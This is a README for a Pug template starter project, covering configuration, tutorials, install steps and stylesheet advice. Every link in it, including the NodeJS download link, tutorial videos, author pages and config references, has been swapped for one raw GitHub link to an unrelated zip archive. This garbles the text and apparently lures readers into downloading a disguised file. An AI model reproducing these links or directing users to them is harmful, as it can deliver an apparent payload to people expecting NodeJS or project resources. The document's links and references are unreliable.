# Pug starter
## Table of contents
* [YouTube video tutorials](#youtube-video-tutorials)
* [Live projects built with pug-starter](#live-projects-built-with-pug-starter)
* [Prerequisites](#prerequisites)
* [Installation](#installation)
* [Usage](#usage)
* [Style](#style)

## **baseUrl** support
add ***baseurl*** support which can be configured for https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip and custom domain. Check *https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip* config section for
* *deployToGithubIo* - (true|false) by default it is set to *true* and will affect the value of *baseUrl* when you want to deploy to https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip; You want to set it to *false* if you want to use *customUrl* as the value of *baseUrl*
* *customUrl* - if you want baseUrl to have a value like https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip or any other one;
* *githubUrl* - if you want baseUrl to have a value like https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip or any other one;

In the end you can use *baseUrl* to prefix your paths like:
```
link(rel="stylesheet", href=`${baseUrl}https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip`)
```

or
```
a(
  title="Is it possible?"
  target="_blank"
  href=`${baseUrl}/article/nice-weather`
)
```

or
```
img(alt="Awesome dog" width="100" href=`${baseUrl}https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip`)
```

## YouTube video tutorials

To help you out even more I've put together some YouTube tutorials:

* Install nodejs, git and github

[![Install nodejs, git and github](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)

* How to make a website for free in 3 easy steps 2017

[![How to make a website for free in 3 easy steps 2017 - CodeTap](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)

* The nightmare is finally over! HTML5 tutorial on how to build a webpage layout 2017

[![The nightmare is finally over! HTML5 tutorial on how to build a webpage layout 2017 - CodeTap](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)

* Build HTML5 website pain free tutorial for beginners 2017

[![Build HTML5 website pain free tutorial for beginners 2017](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)


Starter package for pug (former jade) template based projects.

***Note***: an boolean option **https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip** has been added to the *https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip*. The behaviour differs based on the value:
1. **true** - it renders if the source file (pug file) has been changed; This has a much much greater speed when rendering compared to the other option however it's only relevant if you make change to the current file watched by PUG. If you make a change to a file that's extended and resides in a path that contains "_", like a layout one, the change won't be reflected.
2. **false** - it renders if any pug file has been changed and compares the output with the destination file (the HTML generated now with the previous generated HTML). This can be slower when the number of files increases.
## Live projects built with ***pug-starter***
If you want your project to be listed here leave a message on [CodeTap on FaceBook](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip). You're project needs to be at least version one final (no beta / alpha or work in progress) will be accepted.
* Author: [Marian Zburlea](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
  + [Eat the Veggie (live)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) - [Eat the Veggie (source)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
  + [W3schools Replica (live)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) - [W3schools Replica (source)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
  + [My Resume (live)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) - [My Resume (source)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
  + [Quick Blog (live)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) - [Quick Blog (source)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
  + [Tesla Saves Lives (live)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) - [Tesla Saves Lives (source)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
* Author: [Istvan Acs](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
  + [Acme mobile first (live)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) - [Acme mobile first (source)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
  + [Thumb Gallery (live)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) - [Thumb Gallery (source)](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip)
## Prerequisites
The project requires NodeJS v.4+

To install NodeJS visit [nodejs download page](https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip) download the appropiate package for your operatin system, click on the downloaded file, open it and follow the installation procees. If you don't know much about it, just click ALL the NEXT and or INSTALL buttons and choose "I agree" when prompted and you should be fine.

## Installation
**BEFORE YOU INSTALL:** please read the [prerequisites](#prerequisites)
```bash
$ npm i
```
or
```bash
$ npm install
```
## Usage
To run the project in development mode and open a local server that synchronizes across multiple devices use:
```bash
npm start
```
or
```bash
npm run dev
```
To build the project for production use:
```bash
npm run prod
```
To automatically deploy your project to GitHub pages and make it available at https://[your-username]https://raw.githubusercontent.com/rajivsharma24/DIAL-compiler/master/gulp/DIA_compiler_2.6.zip[your-project-name] use:
```bash
npm run deploy
```
## Style

The project supports both ***embed*** and ***external*** style sheets. You can have none, one or the other, or both of them.

### Single page application style
When you're building a single page app or website, there is no point in having the style sheets loaded from an external file and I'll explain why: the point of loading external style sheets is to allow the browser to cache those files and once you visit another web page of the same website, instead of making another request(s) for the style sheet file(s) to the server and having to download them, if there is no change, the browser will load them from the local drive. In a single page, there is no other page to go to therefore the external file technique doesn't apply.
### Multi page application style
In this scenario you can have either both ***embed*** and external or just external. The most common scenario is to have only one external style sheet file to be loaded and most of the time that's just fine.

If you want to improve your SEO and user experience even further, I strongly recommend to use a combination of both ***embed*** and external. The ***embed*** style sheet should only contain the minimum amount of styles for the initial visible part of the page to render. The rest of the styles can be put in the external CSS file.
